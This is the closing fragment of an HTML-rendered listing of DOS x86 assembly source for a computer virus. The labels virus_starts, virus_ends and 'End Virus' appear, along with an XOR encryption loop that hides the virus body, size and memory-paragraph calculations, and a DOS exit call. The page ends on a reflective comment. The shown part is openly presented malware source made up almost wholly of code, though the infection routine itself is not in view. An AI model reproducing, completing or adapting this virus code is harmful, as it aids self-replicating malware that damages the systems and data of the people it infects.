</span><span class="sc5">@crypt_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@crypt_loop</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">virus_ends</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">virus_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">virus_ends</span><span class="sc4">-</span><span class="sc5">virus_starts</span><span class="sc0">
</span><span class="sc5">virus_16b</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">temp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Fut_Crypt</span><span class="sc4">],(</span><span class="sc5">temp</span><span class="sc4">-</span><span class="sc5">decrypt</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">temp2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Virus</span><span class="sc0">

</span><span class="sc1">; But, in the end, I recover normality. Happier. Thoughtless ?</span><span class="sc0">
</span></div></body>
</html>
